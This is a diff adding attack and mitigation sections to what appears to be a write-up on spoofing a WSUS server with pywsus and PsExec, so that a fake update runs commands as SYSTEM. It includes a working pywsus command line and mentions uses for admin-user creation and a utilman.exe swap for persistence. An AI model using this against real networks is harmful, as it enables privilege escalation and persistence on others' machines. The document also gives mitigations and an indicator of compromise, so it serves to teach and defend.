@@ -89,3 +89,22 @@ Opening a Powershell (or cmd) and running `ping wsusserver.domain.internal` shou
 
 # Attack
 
+First we download the PsExec binary files from [Sysinternals](https://live.sysinternals.com/), it's important that the executable we're gonna use for the payload is signed by Microsoft and this is a great candidate.
+Second, we git pull [pywsus](https://github.com/GoSecure/pywsus) which will emulate a WSUS server and serve a fake update with our payload. This may require the manual install of some libraries which I found perfectly available using `apt install`.
+
+Once pulled and downloaded all that's left to do is giving a command and deploying the payload, for our example we will just write the output of `whoami` to a file in `C:\` but potentially this can be used to add a user as admin or achieve other types of persistence such as moving the `cmd.exe` in the place of `utilman.exe`
+
+```
+python3 pywsus.py -H 192.168.222.1 -p 8530 -e /path/to/PsExec64.exe -c '/accepteula /s cmd.exe /c "whoami > C:\\poc.txt"'
+```
+
+Then we either wait for Windows to check updates or we start the update check ourselves and wait for it to "install updates". You should find a file in `C:\poc.txt` containing `nt authority/system` confirming that we did in fact ran a command as System on the target machine.
+
+# Mitigations
+As suggested from the Github page of pywsus, here's some possible mitigations for this attack:
+The three major ways of generating a certificate for a WSUS server are:
+- Using an internal PKI for which a Root CA certificate is deployed on domain computers and a certificate signed by that Root CA is used to serve WSUS updates
+- Purchasing a certificate signed by a third-party CA authority trusted in the Windows OS trust store
+- Using a self-signed certificate and push a copy of this certificate on all domain computers using a GPO
+
+As a possible IOC, the attacked computer will report extra updates or at least it keeps a list of them. Looking for non-approved ones would help.
